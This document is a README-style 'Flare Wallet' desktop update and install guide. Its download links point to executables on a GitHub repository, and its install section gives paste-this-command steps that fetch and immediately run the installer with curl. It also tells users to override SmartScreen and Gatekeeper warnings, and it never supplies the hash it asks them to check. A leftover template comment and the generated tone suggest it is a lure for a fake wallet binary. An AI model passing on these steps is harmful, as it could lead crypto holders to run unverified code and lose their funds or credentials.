![Flare Wallet](assets/banner-article.png)

# Flare Wallet Update: Keep the Desktop App on the Current Release

The tag is the source of truth, not a version number in a menu.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

Updating means installing the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) over your existing setup, after a backup.

> Back up and test a restore before you replace a build. An update is a good moment to discover a transcription error, and a terrible one.

Flare Wallet is distributed as releases, and this page found no in-app update mechanism it can vouch for. The current tag is `v1.3.02`, and it is the only tag in the repository with a published release, so "am I current?" has a single answer you can check in the browser.

<!-- ARTICLE-BODY-BEGIN -->

## How to tell whether you are current

Open the release page and read the tag. If it says `v1.3.02`, you are on the current release. The installed application does not need to agree with a menu label for this to be true: the tag is the artefact, and the artefact is what matters.

Older tags exist in the repository, but only the current one carries a published release with attached files. An older tag is a piece of history, not an alternative download.

## The right order to update in

1. Confirm your recovery phrase is written down and restores an empty wallet correctly.
2. Note the address you expect to see afterwards.
3. Download the current release for your platform and check the hash.
4. Install it over the existing application.
5. Open it, unlock, and confirm the same address and balance appear.

Step one is not ceremony. An update replaces the local application; the wallet exists because of the phrase, so the phrase is what makes the replacement safe.

## Does it update itself?

This page cannot confirm an auto-update mechanism, and it will not guess one into existence. Treat every update as a manual install from the release page until you have seen otherwise in your own build, which also means the release page is the place to check rather than a notification you did not expect.

A prompt that appears inside the application asking you to download something from outside this account deserves suspicion, not obedience.

## After the update

Confirm three things: the address, the balance, and the network. The first two come from the restored wallet; the third is chain ID 14. If the balance looks wrong, check the explorer before changing anything, and read the diagnostic order in <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-not-syncing.md"">Flare Wallet not syncing</a>.

If the update fails to start, remove the application and install again from the release page. What you must not do is remove it before confirming the phrase, which is the subject of <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-backup.md">Flare Wallet backup and restore</a>.

## Why the old build may still work

An older build can keep functioning for a while, because the network does not require a particular client version to sign a transaction. That is a reason not to panic, not a reason to stay put: an old build may display newer chain data incorrectly or miss a fix you need. The build to install is in the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a>.

The safe position is simple. Keep the current release installed, keep the phrase written down, and treat any odd behaviour as a reason to compare the wallet against the explorer rather than as a reason to reinstall repeatedly.

## FAQ

### Does Flare Wallet Desktop auto-update?

This page cannot confirm an automatic update path. The reliable method is to install the current release from the release page over your existing setup.

### How do I know which version I have?

Check the file you installed, or the tag you downloaded it from. The release page names the current tag, and only that tag carries published files.

### Will updating erase my wallet?

No. The wallet is derived from your phrase, and installing over the application does not change the phrase. Back it up anyway, because an install that fails halfway is the moment you want a tested restore.

### Can I skip versions?

Yes. Install the current release directly; there is no ordered chain of patches to apply.

### What if the new build will not open?

Remove it and install again from the release page, after confirming your backup. If it still will not start, the machine is the suspect rather than the wallet.

### Where do I download the update?

From the release page linked above. <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md">download Flare Wallet</a> lists the three filenames and the checksum step.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet download](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md) | [Flare Wallet backup and restore](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-backup.md) | [Flare Wallet not syncing](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-not-syncing.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
